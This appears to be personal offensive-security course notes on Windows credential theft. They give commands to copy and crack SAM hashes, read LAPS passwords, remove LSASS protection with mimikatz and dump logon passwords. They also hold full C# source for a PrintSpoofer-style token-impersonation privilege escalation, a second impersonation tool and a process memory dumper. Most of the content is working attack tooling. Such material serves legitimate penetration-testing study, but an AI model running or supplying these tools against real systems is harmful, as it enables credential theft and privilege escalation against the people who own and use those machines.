# Windows Credentials
## Local Windows Credentials
### Dump SAM FILE
```
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system

reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
reg save HKLM\system C:\users\offsec.corp1\Downloads\system


hashcat -a 0 ./hash ~/Tool\ Set.localized/wordlists/rockyou.txt -m 1000
32ed87bdb5fdc5e9cba88547376818d4:123456
```
###  Local Administrator Password Solution(LAPS)
LAPSToolkit.ps1
```Get-LAPSComputers ``` List Local Computer hostname and password
```Find-LAPSDelegatedGroups```  Find Group Name
```Get-NetGroupMember -GroupName "LAPS Password Readers"``` Get Group member 
`Get-LAPSComputers` Get LAPSComputers administrator user password
 
* LAPS Password Readers can access most host to reader local administrator password
### Elevation with Impersonation
#### Print Impersonation SID C#
```
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace PrintSpoofer
{
    public class Program
    {
        public static uint PIPE_ACCESS_DUPLEX = 0x3;
        public static uint PIPE_TYPE_BYTE = 0x0;
        public static uint PIPE_WAIT = 0x0;
        public static uint TOKEN_ALL_ACCESS = 0xF01FF;
        public static uint TOKENUSER = 1;
        public static uint SECURITY_IMPERSONATION = 2;
        public static uint TOKEN_PRIMARY = 1;

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }
        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentThread();

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        public static void Main(string[] args)
        {
            // Parse arguments (pipe name)
            if (args.Length != 2)
            {
                Console.WriteLine("Please enter the pipe name to be used and the binary to trigger as arguments.\nExample: .\\PrintSpoofer.exe \\\\.\\pipe\\test\\pipe\\spoolss c:\\windows\\tasks\\bin.exe");
                return;
            }
            string pipeName = args[0];
            string binToRun = args[1];

            // Create our named pipe
            IntPtr hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            // Connect to our named pipe and wait for another client to connect
            Console.WriteLine("Waiting for client to connect to named pipe...");
            bool result = ConnectNamedPipe(hPipe, IntPtr.Zero);

            // Impersonate the token of the incoming connection
            result = ImpersonateNamedPipeClient(hPipe);

            // Open a handle on the impersonated token
            IntPtr tokenHandle;
            result = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, out tokenHandle);

            // Duplicate the stolen token
            IntPtr sysToken = IntPtr.Zero;
            DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION, TOKEN_PRIMARY, out sysToken);

            // Create an environment block for the non-interactive session
            IntPtr env = IntPtr.Zero;
            bool res = CreateEnvironmentBlock(out env, sysToken, false);

            // Get the impersonated identity and revert to self to ensure we have impersonation privs
            String name = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine($"Impersonated user is: {name}.");
            RevertToSelf();

            // Get the system directory
            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = GetSystemDirectory(sbSystemDir, 256);

            // Spawn a new process with the duplicated token, a desktop session, and the created profile
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            STARTUPINFO sInfo = new STARTUPINFO();
            sInfo.cb = Marshal.SizeOf(sInfo);
            sInfo.lpDesktop = "WinSta0\\Default";
            CreateProcessWithTokenW(sysToken, LogonFlags.WithProfile, null, binToRun, CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref sInfo, out pInfo);
            Console.WriteLine($"Executed '{binToRun}' with impersonated token!");
        }
    }
}
```
#### Use Impersonate Token Get Shell
**important must spooler service start**
```
psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe
SpoolSample.exe \[Hostname\] \[Hostname\]/pipe/test
ImpersonateNamedPipe.exe excutefilename  \\\\.\\pipe\\test\\pipe\\spoolss
```
#### 12.2.2.1 Exercises
```
using System;
using System.Runtime.InteropServices;

namespace ImpersonateNamedPipe
{
    class Program
    {
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }
        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: "+AppDomain.CurrentDomain.FriendlyName+" excutefilename pipename");
                return;
            }
            string excutefilename = args[0];
            string pipeName = args[1];

            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            ConnectNamedPipe(hPipe, IntPtr.Zero);

            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;

            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;

            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);

            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);

            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);

            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            CreateProcessWithTokenW(hSystemToken, 0, null, excutefilename, 0, IntPtr.Zero, null, ref si, out pi);
        }
    }
}

```
####  meterpreter load incognito
![[Pasted image 20210712220320.png]]
#### Mimikatz
LSASS-SeDebugPrivilege
```
privilege::debug
sekurlsa::logonpasswords
```
##### bypass HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa 
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started

mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 536 -> 00/00 [0-0-0]

mimikatz # sekurlsa::logonpasswords

```
##### Offline dump lsass
use taskmanager dump lsass process memory -> lsass.dmp
```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
#### Process Memory dump C#
```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace ProcessMemorydump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,IntPtr hFile, int DumpType, IntPtr ExceptionParam,IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,int processId);


        static void Main(string[] args)
        {
            if (args.Length < 1) {
                Console.WriteLine("Usage:"+AppDomain.CurrentDomain.FriendlyName + " processname " + "path" );
                System.Environment.Exit(1);
            }
            string processname = args[0];
            string dir = args[1];

            Process[] pi = Process.GetProcessesByName(processname);
            int processname_pid = pi[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, processname_pid);

            string pathfile = dir + processname + ".dmp";

            FileStream dumpFile = new FileStream(pathfile, FileMode.Create);

            bool dumped = MiniDumpWriteDump(handle, processname_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero,IntPtr.Zero);

            Console.WriteLine("Dump " + processname +" Process Memory is " + dumped);
        }
    }
}

```
# Espotato SeImpersonatePrivilege
[GitHub - zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).](https://github.com/zcgonvh/EfsPotato)
`csc.exe /target:exe /out:path file`
# lsass protection bypass
https://github.com/itm4n/PPLdump
# AD search
https://github.com/CroweCybersecurity/ad-ldap-enum





